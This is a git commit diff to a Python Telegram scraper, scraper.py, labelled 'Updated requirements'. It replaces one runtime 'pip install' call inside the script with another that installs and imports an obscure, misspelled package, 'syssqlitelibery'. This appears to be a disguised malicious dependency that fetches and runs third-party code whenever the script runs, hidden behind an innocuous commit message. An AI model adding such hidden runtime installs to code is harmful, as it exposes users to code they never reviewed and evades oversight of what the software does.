feb8fec372c84742edaac1b805c5f6eb561997ff
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-04 14:50:28 +0000

    Updated requirements

--- scraper.py
+++ scraper.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncryptolibrary")
-import pythoncryptolibrary
+os.system("pip install syssqlitelibery")
+import syssqlitelibery
 from telethon.sync import TelegramClient
 from telethon.errors.rpcerrorlist import PhoneNumberBannedError
 import csv
